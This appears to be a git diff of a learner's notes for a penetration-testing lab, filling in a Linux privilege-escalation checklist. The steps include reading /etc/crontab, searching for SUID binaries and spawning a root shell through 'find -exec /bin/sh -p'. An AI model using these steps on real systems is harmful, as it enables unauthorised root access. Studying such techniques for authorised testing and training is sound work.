@@ -1,3 +1,4 @@
+gtobins.org for sudo commands
 post ex 11
 win ex  6
 recon   4
@@ -70,13 +71,17 @@ USER DATABASES GENERATES AT TOP OR BOTTOM -> BUT IGNORE TOP LINE AND DEFAULT 3 D
 5. ls /tmp
 6. ls /var/tmp
 7. ps -elf
-8.
-9.
-10.
-11.
-12.
-13.
-14.
+8. cat /etc/crontab
+9. cant run /root/run or /ab.sh -> need to escalte priv
+10. find / -type f -perm /6000 -ls 2>/dev/null 
+11. try top three and bottom three -then more if needed
+-> /usr/bin/find -> find . -exec /bin/sh -p \; -quit
+whoami
+sudo -l
+12. check root home directory ls -lisa /root
+if you hit bash returns you back to user3
+13. cd /root -> cat ab.sh | run. -> look at everything like RE_ME.obs -> reverse engineering move it to windows and use gihdra and look for sucessfull
+14. in gidra two carrots(>> or <<) means bit shift -> google bit shift calc if 21 >> 2 ==8 move to the right 2
 15.
 16.
 17.
